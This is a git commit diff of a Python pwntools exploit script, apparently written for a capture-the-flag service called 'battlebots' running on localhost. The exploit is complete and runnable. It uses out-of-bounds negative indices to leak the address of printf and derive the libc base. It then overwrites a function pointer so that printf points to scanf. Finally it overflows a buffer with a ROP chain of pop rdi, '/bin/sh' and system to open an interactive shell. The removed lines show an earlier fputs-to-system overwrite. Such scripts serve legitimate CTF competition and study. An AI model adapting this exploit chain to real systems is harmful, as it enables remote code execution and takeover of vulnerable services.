988eda09be679d4576c90fe8363fd99d4ecc5fdb
rednik1337 <micalculator@bk.ru>
2025-07-15 10:54:50 +0300

    upd

--- sploits/battlebots/sploit.py
+++ sploits/battlebots/sploit.py
@@ -1,6 +1,5 @@
 from pwn import *
 
-#context.log_level = 'debug'
 
 def view(bid):
     r.sendlineafter(b'--> ', b'1')
@@ -27,39 +26,67 @@ def leave_feedback(feedback):
     r.sendlineafter(b'--> ', b'4')
     r.sendlineafter(b' > ', b'n')
     r.sendlineafter(b' > ', feedback.encode())
+    r.recvuntil(b'chad id: ')
+    fid = r.recvuntil(b'\n').strip()
+    return fid
+
 
 
 print('[*] connecting')
 r = remote('localhost', 55555)
+#r = process('./battlebots')
 
-print('[*] viewing battlebot -9')
-hp9, shd9, atk9 = view(2**32 * 2 - 9)
-print(f'[+] {hp9} {shd9} {atk9}')
+print('[*] leaving feedback')
+fid = leave_feedback('amogus')
+print(f'[+] fid: {fid}')
 
-print('[*] viewing battlebot -10')
-hp10, shd10, atk10 = view(2**32 * 2 - 10)
-print(f'[+] {hp10} {shd10} {atk10}')
+print('[*] viewing battlebot -24')
+hp, shd, atk = view(2**32 * 2 - 24)
+print(f'[+] {hp} {shd} {atk}')
 
-fputs = hp9.to_bytes(4, byteorder='little', signed=True)[:2][::-1]
-fputs += atk10.to_bytes(4, byteorder='little', signed=True)[::-1]
-fputs = int.from_bytes(fputs)
-print(f'[+] fputs: {hex(fputs)}')
+printf = hp.to_bytes(4, byteorder='little', signed=True)
+printf += shd.to_bytes(4, byteorder='little', signed=True)[:2]
+printf = int.from_bytes(printf[::-1])
+print(f'[+] printf: {hex(printf)}')
 
-system = fputs - 0x004609b1 + 0x0045bb7e
-print(f'[+] system: {hex(system)}')
+libc = printf - 0x004621b1
+scanf = libc + 0x00462616
+print(f'[+] scanf: {hex(scanf)}')
 
-print(f'[*] overwriting fputs to system')
-system = p64(system)
-hp9 = int.from_bytes(system[4:], byteorder='little')
-atk10 = int.from_bytes(system[:4], byteorder='little')
+print(f'[*] overwriting printf to scanf')
+scanf = p64(scanf)
+hp = int.from_bytes(scanf[:4], byteorder='little')
+shd = int.from_bytes(scanf[4:], byteorder='little')
 
-print(f'[*] editing battlebot -9 to {hp9} {shd9} {atk9}')
-edit(2**32 * 2 - 9, hp9, shd9, atk9)
+print(f'[*] editing battlebot -24 to {hp} {shd} {atk}')
+r.sendlineafter(b'--> ', b'2')
+r.sendlineafter(b' > ', str(2**32 * 2 - 24).encode())
+r.sendlineafter(b' > ', str(hp).encode())
+r.sendline(str(shd).encode())
+r.sendline(str(atk).encode())
 
-print(f'[*] editing battlebot -10 to {hp10} {shd10} {atk10}')
-edit(2**32 * 2 - 10, hp10, shd10, atk10)
 
-print(f'[*] legalize nuclear bombs')
-leave_feedback('/bin/sh')
+print(f'[*] almost there')
+poprdiret = libc + 0x0000000000014413 + 0x400000
+binsh = libc + 0x0049ffe1
+ret = libc + 0x0000000000014126 + 0x400000
+system = libc + 0x0045bb7e
+print(f'[*] {hex(poprdiret)} pop rdi; ret;')
+print(f'[*] {hex(binsh)} /bin/sh')
+print(f'[*] {hex(ret)} ret;')
+print(f'[*] {hex(system)} system')
+
+
+r.sendline(b'4')
+r.sendline(b'y')
+r.sendline(fid)
+r.sendlineafter(b'Chat history:\n', b'amogus')
+
+print('[*] ropping')
+r.sendline(b'Z' * cyclic_find(b'waau') + p64(poprdiret) + p64(binsh) + p64(ret) + p64(system))
+
+print('[*] ok lets go')
+r.sendline(b'5')
+r.sendline(b'5')
 
 r.interactive()
